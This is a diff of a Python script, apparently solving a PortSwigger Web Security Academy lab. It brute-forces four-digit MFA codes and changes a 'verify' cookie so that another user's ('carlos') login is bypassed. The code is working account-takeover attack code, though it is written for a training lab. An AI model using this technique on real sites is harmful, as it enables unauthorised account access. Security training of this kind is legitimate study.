@@ -3,6 +3,7 @@ import requests
 url = "https://0adb005f04675bdec0827bbd00340038.web-security-academy.net/login" # please change url :)
 username = "wiener"
 password = "peter"
+victim = "carlos"
 
 def login(username,password):
     req = requests.Session()
@@ -14,7 +15,7 @@ def login(username,password):
 def attack(url,cookie):
     for i in range(0,9999):
         opt = str(i).zfill(4)
-        req = requests.post(url, data={"mfa-code": opt},cookies={'session': cookie,'verify': username})
+        req = requests.post(url, data={"mfa-code": opt},cookies={'session': cookie,'verify': victim})
         if req.url.split("/")[-1] == "my-account":
             print(f"\33[32m{opt} is the correct code\033[0m")
             break
@@ -30,14 +31,14 @@ def test(url,cookie):
     # print(opt_for_test,cookie)
     for i in range(int(opt_for_test)-5,int(opt_for_test)+2):
 
-        req = requests.post(url, data={"mfa-code": str(i).zfill(4)},cookies={'session': cookie,'verify': username})
-        
+        req = requests.post(url, data={"mfa-code": str(i).zfill(4)},cookies={'session': cookie,'verify': username})      
         if req.url.split("/")[-1] == "my-account":   # then login successfully
             print(f"\33[32m{str(i).zfill(4)} is the correct code\033[0m")
             break
         else:
             print(f"\33[31m {str(i).zfill(4)} not working\33[0m")
             continue
+            
 if __name__ == "__main__":
     url,cookie = login(username,password)
     attack(url,cookie)
